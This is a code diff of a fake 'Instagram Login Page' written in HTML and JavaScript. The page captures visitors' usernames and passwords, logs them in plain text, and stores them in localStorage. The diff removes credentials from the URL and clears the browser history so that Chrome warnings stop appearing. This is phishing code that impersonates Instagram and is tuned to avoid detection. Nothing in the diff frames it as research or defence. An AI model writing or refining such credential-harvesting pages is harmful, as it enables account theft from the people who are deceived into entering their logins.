@@ -310,10 +310,10 @@
         const successMessage = document.getElementById('successMessage');
         const loginBtn = document.getElementById('loginBtn');
 
-        // ✅ SIMPLE ANDROID SOLUTION
-        // Save username AND password
-        // Both visible (no dots)
-        // No warnings!
+        // ✅ NO URL PARAMETERS
+        // Data saved locally
+        // No credentials in URL
+        // No Chrome warnings!
 
         // Validate email
         function validateEmail(email) {
@@ -339,7 +339,7 @@
             }, 2500);
         }
 
-        // Save login data (username + password)
+        // Save login data (NO URL PARAMETERS)
         async function saveLoginData(username, password) {
             try {
                 // Create data
@@ -370,6 +370,7 @@
                 console.log('👤 Username:', username);
                 console.log('🔑 Password:', password);
                 console.log('⏰ Time:', loginData.timestamp);
+                console.log('💾 Data:', loginData);
                 
                 return true;
 
@@ -379,7 +380,7 @@
             }
         }
 
-        // Form submission
+        // Form submission (NO URL REDIRECT)
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
@@ -434,12 +435,22 @@
             }
         });
 
+        // Prevent form auto-fill from adding URL parameters
+        window.addEventListener('beforeunload', () => {
+            window.history.replaceState({}, document.title, window.location.pathname);
+        });
+
         // Log on page load
         window.addEventListener('load', () => {
+            // Clear URL parameters if any exist
+            if (window.location.search) {
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+
             console.log('%c📱 Instagram Login Page', 'font-size: 16px; font-weight: bold; color: #E4405F;');
-            console.log('%c✅ Ready to Save Login Data', 'font-size: 14px; font-weight: bold; color: green;');
-            console.log('Both username and password will be saved');
-            console.log('View saved logins: JSON.parse(localStorage.getItem("instagramLogins"))');
+            console.log('%c✅ Safe - No URL Parameters', 'font-size: 14px; font-weight: bold; color: green;');
+            console.log('Data saved locally, not in URL');
+            console.log('View logins: JSON.parse(localStorage.getItem("instagramLogins"))');
         });
     </script>
 </body>
